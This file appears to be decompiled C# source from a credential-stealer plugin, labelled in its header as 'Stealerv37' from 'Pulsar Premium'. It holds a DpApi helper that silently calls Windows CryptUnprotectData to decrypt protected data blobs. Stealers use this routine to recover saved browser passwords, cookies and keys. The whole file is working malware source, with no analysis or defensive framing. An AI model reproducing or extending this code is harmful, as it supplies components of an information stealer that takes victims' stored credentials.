// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Encrypted.DpApi
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Runtime.InteropServices;

#nullable disable
namespace Intelix.Helper.Encrypted;

public static class DpApi
{
  private static Intelix.Helper.NativeMethods.CryptprotectPromptstruct Prompt = new Intelix.Helper.NativeMethods.CryptprotectPromptstruct()
  {
    cbSize = Marshal.SizeOf(typeof (Intelix.Helper.NativeMethods.CryptprotectPromptstruct)),
    dwPromptFlags = 0,
    hwndApp = IntPtr.Zero,
    szPrompt = (string) null
  };

  public static byte[] Decrypt(byte[] bCipher)
  {
    Intelix.Helper.NativeMethods.DataBlob pDataIn = new Intelix.Helper.NativeMethods.DataBlob();
    Intelix.Helper.NativeMethods.DataBlob pDataOut = new Intelix.Helper.NativeMethods.DataBlob();
    Intelix.Helper.NativeMethods.DataBlob pOptionalEntropy = new Intelix.Helper.NativeMethods.DataBlob();
    string empty = string.Empty;
    GCHandle gcHandle = GCHandle.Alloc((object) bCipher, GCHandleType.Pinned);
    pDataIn.cbData = bCipher.Length;
    pDataIn.pbData = gcHandle.AddrOfPinnedObject();
    try
    {
      if (!Intelix.Helper.NativeMethods.CryptUnprotectData(ref pDataIn, ref empty, ref pOptionalEntropy, IntPtr.Zero, ref DpApi.Prompt, 0, ref pDataOut) || pDataOut.cbData == 0)
        return (byte[]) null;
      byte[] destination = new byte[pDataOut.cbData];
      Marshal.Copy(pDataOut.pbData, destination, 0, pDataOut.cbData);
      return destination;
    }
    finally
    {
      gcHandle.Free();
      if (pDataOut.pbData != IntPtr.Zero)
        Marshal.FreeHGlobal(pDataOut.pbData);
      if (pOptionalEntropy.pbData != IntPtr.Zero)
        Marshal.FreeHGlobal(pOptionalEntropy.pbData);
    }
  }
}
